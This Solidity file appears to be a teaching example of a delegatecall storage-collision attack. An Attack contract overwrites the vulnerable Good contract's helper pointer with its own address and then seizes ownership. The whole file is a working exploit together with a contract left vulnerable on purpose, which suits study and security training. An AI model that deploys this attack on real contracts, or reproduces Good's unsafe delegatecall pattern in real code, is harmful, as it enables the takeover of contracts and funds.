// We will have three smart contracts Attack.sol, Good.sol and Helper.sol
// Hacker will be able to use Attack.sol to change the owner of Good.sol using .delegatecall()

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Helper {
    uint256 public num;

    function setNum(uint256 _num) public {
        num = _num;
    }
}

contract Good {
    address public helper;
    address public owner;
    uint256 public num;

    constructor(address _helper) {
        helper = _helper;
        owner = msg.sender;
    }

    function setNum(uint256 _num) public {
        helper.delegatecall(abi.encodeWithSignature("setNum(uint256)", _num));
    }
}

contract Attack {
    address public helper;
    address public owner;
    uint256 public num;

    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint256 _num) public {
        owner = msg.sender;
    }

    function attack() public {
        // This is the way you typecast an address to a uint
        good.setNum(uint256(uint160(address(this))));
        good.setNum(1);
    }
}
